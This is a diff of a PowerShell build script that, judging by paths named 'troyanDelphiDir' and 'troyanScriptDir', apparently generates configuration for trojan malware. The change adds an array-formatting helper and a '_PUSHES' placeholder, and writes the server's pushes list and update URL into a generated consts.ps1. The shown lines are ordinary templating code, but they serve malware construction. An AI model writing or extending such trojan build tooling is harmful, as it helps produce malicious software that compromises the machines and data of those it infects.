@@ -25,11 +25,27 @@ Get-ChildItem -Path $server.troyanDelphiDir -Filter "_*" | Remove-Item -Force
 
 
 
+function Format-ArrayToString {
+    param (
+        [string[]]$inputArray
+    )
+    if ($inputArray -eq $null -or $inputArray.Length -eq 0) {
+        return ""
+    }
+    $result = ""
+    foreach ($item in $inputArray) {
+        $result += "'${item}', "
+    }
+    $result = $result.TrimEnd(', ')
+    return $result
+}
+
 #certs
 $template = @"
 `$PrimaryDNSServer = '1.1.1.1'
 `$SecondaryDNSServer = '2.2.2.2'
 `$updateUrl = '_updateUrl'
+`$xpushes = @(_PUSHES)
 `$xdata = @{
     JOPA
 }
@@ -58,6 +74,8 @@ if ($server.autoUpdate)
 {
     $template = $template -replace "_updateUrl", $server.updateUrl
 }
+$pushes = Format-ArrayToString($server.pushes)
+$template = $template -replace "_PUSHES", $pushes
 $template  = $template -replace "JOPA", $listString
 $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')
 
